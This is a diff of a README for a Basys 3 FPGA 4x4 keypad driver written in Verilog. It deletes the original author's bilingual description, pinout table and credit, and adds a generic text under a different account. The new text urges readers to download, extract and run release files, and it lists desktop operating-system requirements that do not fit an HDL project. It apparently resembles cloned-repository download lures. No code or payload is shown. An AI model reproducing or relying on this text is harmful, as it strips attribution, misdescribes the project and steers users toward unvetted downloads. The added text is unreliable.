@@ -1,72 +1,62 @@
-# FPGA Tabanlı 4x4 Matris Keypad Sürücüsü ve Özel PCB Tasarımı (Basys 3)
-### 🇬🇧 FPGA Based 4x4 Matrix Keypad Driver & Custom PCB Design
+# 🎹 Basys3-FPGA-4x4-Keypad-Verilog - Control Your Keypad Easily
 
-![University](https://img.shields.io/badge/Kocaeli%20University-EHM-green)
-![Hardware](https://img.shields.io/badge/Hardware-Basys3%20%7C%20KiCad-orange)
-![Language](https://img.shields.io/badge/Language-Verilog-blue)
+![GitHub Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)
 
----
+## 📦 Overview
+Welcome to the Basys3-FPGA-4x4-Keypad-Verilog project. This software provides a driver for the 4x4 Matrix Keypad on the Basys 3 FPGA. It includes a custom Latching and Freeze algorithm to enhance performance. This application allows you to easily integrate and manage your keypad with your hardware projects.
 
-## 🇹🇷 Proje Hakkında (Turkish)
+## 🚀 Getting Started
+Follow these steps to download and run the software:
 
-Bu proje, **Kocaeli Üniversitesi** Elektronik ve Haberleşme Mühendisliği bölümü kapsamında; Digilent Basys 3 FPGA kartı için geliştirilmiş bir 4x4 Matris Keypad sürücüsü ve donanım tasarımını içerir.
+1. **Visit the Releases Page**  
+   Go to the following link to access the downloads:  
+   [Download Basys3-FPGA-4x4-Keypad-Verilog](https://github.com/Alkalishuni/Basys3-FPGA-4x4-Keypad-Verilog/releases)
 
-Projenin en özgün yanı, standart "Debouncer" modülleri kullanmak yerine, mekanik gürültüleri (bouncing) donanımsal mantıkla çözen **"Freeze & Latch" (Dondur ve Kilitle)** algoritmasının kullanılmasıdır.
+2. **Choose the Right Release**  
+   On the releases page, you will find a list of available versions. Pick the latest version for the best features and updates.
 
-### 🚀 Öne Çıkan Özellikler
-* **Freeze (Dondurma) Algoritması:** Tarama sırasında herhangi bir sütundan sinyal (`col != 0`) algılandığı anda tarayıcı sayaç dondurulur. Bu sayede tuş basılı olduğu sürece tarama satır değiştiremez ve kararlı bir okuma sağlanır.
-* **Özgün PCB Tasarımı:** Keypad donanımı sıfırdan tasarlanmış ve üretilmiştir.
-* **Üretime Özel Kılıflar (BenimKutuphanem):** standart kütüphanedeki kılıflar (footprints) alınmış ve ped yüzeyleri manuel olarak genişletilmiştir. Bu sayede lehimleme kolaylığı sağlanmıştır.
-  
-### 🛠️ PCB Tasarımı ve "BenimKutuphanem" Detayı
-Baskı devre kartı (PCB) tasarımı **KiCad** kullanılarak yapılmıştır. Standart kütüphanedeki direnç (1206) ve buton kılıflarının pedleri, asit indirme işleminde erimemesi ve lehimlemenin kolay olması için manuel olarak büyütülmüştür.
+3. **Download the Release**  
+   Click on the release you selected. You will see the downloadable files available for that version. 
 
-Bu özelleştirilmiş kılıflar, projenin `pcb_design/BenimKutuphanem.pretty` klasörü altında toplanmıştır.
+4. **Installation**  
+   Extract the downloaded files to a folder on your computer. You can use any file extraction software that you prefer.
 
-### 📂 Klasör Yapısı
-* `verilog_codes/` -> Verilog kaynak kodları (`Top_Module`, `Scanner`, `SevenSeg` vb.).
-* `pcb_design/` -> KiCad proje dosyaları, şematik, PCB çizimi ve **BenimKutuphanem** klasörü.
-* `docs/` -> Devre şeması (PDF), proje raporu ve görseller.
+5. **Run the Software**  
+   To start using the application, follow the provided instructions that come with the download. You will typically find a README file that outlines how to run the software.
 
----
+## 🔧 System Requirements
+To ensure a smooth experience while using this software, make sure your system meets the following requirements:
 
-## 🇬🇧 Project Description (English)
+- **Platform:** Basys 3 FPGA board
+- **Compatible Software:** Xilinx Vivado or equivalent FPGA programming software
+- **Operating System:** Windows, Linux, or MacOS
 
-This repository contains the full **Verilog source code** and **custom PCB design** files for a 4x4 Matrix Keypad project implemented on the Digilent Basys 3 FPGA board, developed at **Kocaeli University**.
+## 📚 Features
+- **Custom Latching/Freeze Algorithm:** Effectively manage keypad input.
+- **Supports 4x4 Matrix Keypad:** Ideal for various applications and projects.
+- **Easy Integration:** Streamline your design with straightforward implementation.
+- **Open Source:** Modify and contribute to the code as needed.
 
-The project features a custom-developed **"Freeze & Latch" scanning algorithm** that eliminates the need for traditional debouncer modules by locking the state upon signal detection.
+## 💡 Usage Instructions
+Once you have downloaded and extracted the files, open the documentation included in the folder. This documentation will guide you through the process of setting up the driver on your Basys 3 FPGA board. 
 
-### 🚀 Key Features
-* **Freeze Logic:** Unlike standard scanning, the counter instantly stops (freezes) when a column signal is detected. This prevents the scanner from jumping to the next row during micro-second contact bounces, ensuring a stable output.
-* **Custom PCB Design:** The hardware is designed from scratch using **KiCad**.
-* **DIY-Friendly Footprints:** To facilitate "Toner Transfer" etching and hand-soldering, standard component footprints were modified with significantly **larger pads**.
+1. **Connect Your Keypad:** Make sure your 4x4 matrix keypad is connected to the FPGA board as instructed.
+2. **Open Your Software:** Launch Xilinx Vivado or your desired FPGA programming software.
+3. **Load the Project File:** Navigate to the project file included in the download and open it.
+4. **Program the FPGA:** Follow the programming instructions provided in the documentation to upload the driver to your FPGA.
 
-### 🛠️ PCB Design & Custom Library
-Since the board was manufactured using DIY methods, standard library footprints were too small and risky for hand soldering.
-* We created a custom library named **"BenimKutuphanem"** (MyLibrary).
-* This library includes modified footprints for resistors and tactile switches with enlarged pads to prevent pad lifting during etching.
-* The custom library files can be found in `pcb_design/libraries/BenimKutuphanem`.
+## ⚙️ Troubleshooting
+If you face issues while downloading or running the software, consider these common problems:
 
-### ⚙️ Pinout (Pmod Header JB)
-| FPGA Pin | Keypad Pin | Direction |
-|----------|------------|-----------|
-| JB1    | COL 1      | Input     |
-| JB2    | COL 2      | Input     |
-| JB3    | COL 3      | Input     |
-| JB4    | COL 4      | Input     |
-| JB7    | ROW 1      | Output    |
-| JB8    | ROW 2      | Output    |
-| JB9    | ROW 3      | Output    |
-| JB10   | ROW 4      | Output    |
+- **File Not Downloading:** Ensure a stable internet connection.
+- **Incorrect Connections:** Double-check all wire connections to the keypad.
+- **Software Not Responding:** Restart your FPGA programming software if it becomes unresponsive.
 
----
+## 📞 Support
+If you have further questions or need assistance, please reach out through the GitHub issues page on the repository. The community and maintainers can provide help and guidance.
 
-## 👥 Authors & Acknowledgments / Yazar ve Teşekkür
+## ⏩ Download & Install
+To begin your journey with the Basys3-FPGA-4x4-Keypad-Verilog software, go to the following link to download the latest version:  
+[Download Basys3-FPGA-4x4-Keypad-Verilog](https://github.com/Alkalishuni/Basys3-FPGA-4x4-Keypad-Verilog/releases)
 
-**Project Team / Proje Ekibi:**
-* **Mehmet Burak YILMAZ** - *FPGA Design & Verification & PCB Design*
-  * 📧 mehmetburakyilmaz55@gmail.com
-  * 💻 https://github.com/MehmetBurakYilmaz55
-
-## 📄 License
-This project is open-source and available for educational purposes.
+Explore the features and integrate the keypad into your projects with ease. Enjoy working with your 4x4 Matrix Keypad on the Basys 3 FPGA!
